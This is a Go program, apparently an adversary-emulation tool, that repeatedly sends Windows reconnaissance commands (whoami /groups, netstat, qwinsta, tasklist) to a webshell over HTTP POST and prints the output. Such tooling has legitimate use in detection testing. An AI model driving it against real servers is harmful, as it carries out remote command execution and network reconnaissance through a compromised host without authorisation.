//go:build windows

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"time"
)

type Result struct {
	Response string `json:"Result"`
	Command  string `json:"Command"`
}

func client(hostname string, port string, command_time_delay int, loop_time_delay int, total_run_time int) {

	link := "http://" + hostname

	//Create list and populate with commands
	l := [4]string{"whoami /groups", "netstat -ano", "qwinsta", "tasklist"}

	if total_run_time == 0 { //Will run until user ends the webshell
		for {
			for _, element := range l {
				data := url.Values{}
				data.Set("c", element)
				// Debug output:
				log.Printf("Sending command: \"%s\"\n", element)

				send_command(link, port, data)
				time.Sleep(time.Duration(command_time_delay) * time.Second)
			}
		}
	} else {
		start_time := time.Now()
		for time.Now().Before(start_time.Add(time.Duration(total_run_time) * time.Second)) {
			for _, element := range l {
				data := url.Values{}
				data.Set("c", element)
				// Debug output:
				log.Printf("Sending command: \" %s\"\n", element)

				send_command(link, port, data)
				time.Sleep(time.Duration(command_time_delay) * time.Second)
			}
		}
	}

}

func send_command(link string, port string, data url.Values) {

	b := bytes.NewBufferString(data.Encode())
	url := link + ":" + port

	req, err := http.NewRequest("POST", url, b)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Connection", "keep-alive")

	if err != nil {
		print("Creating header error: %s", err)
	}

	c := http.DefaultClient
	resp, err := c.Do(req)
	if err != nil {
		print("Connection error: %s", err)
	}

	parse_response(*resp)

}

func parse_response(resp http.Response) {

	r, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		print("Read body error: %s", err)
	}

	response1 := Result{}
	jsonErr := json.Unmarshal(r, &response1)
	if jsonErr != nil {
		print("Json fail %s", jsonErr)
	}

	fmt.Printf("Command: %s\n", response1.Command)
	fmt.Printf("Response:\n%s\n", response1.Response)
}
